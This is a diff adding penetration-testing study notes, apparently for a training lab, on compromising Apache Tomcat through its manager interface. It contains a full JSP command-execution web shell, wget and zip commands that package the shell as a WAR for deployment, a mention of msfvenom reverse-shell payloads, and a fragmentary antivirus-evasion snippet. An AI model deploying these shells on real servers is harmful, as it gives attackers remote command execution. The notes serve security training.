@@ -286,3 +286,54 @@ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat
 ### Attacking Tomcat
 * can use the `auxiliary/scanner/http/tomcat_mgr_login` metasploit module to see if we can access /manager or /host-manager by getting creds
 	* should also set `STOP_ON_SUCCESS` to `true` so the scanner stops when we get a successful login
+	* can debug by proxying through burp
+* GUI interface is available at `/manager/html`
+	* The manager web app allows us to instantly deploy new applications by uploading WAR files
+	* A WAR file can be created using the zip utility. A JSP web shell can be downloaded and placed within the archive:
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+```bash
+$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+$ zip -r backup.war cmd.jsp
+```
+* Click on `Browse` to select the .war file and then click on `Deploy`
+* Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server
+* could also use `msfvenom` to generate a malicious WAR file. The payload java/jsp_shell_reverse_tcp will execute a reverse shell through a JSP file
+	* can avoid AV detection by changing to:
+```java
+FileOutputStream(f);stream.write(m);o="uPlOaDeD:
+```
+* All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable to [Ghostcat](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi) 
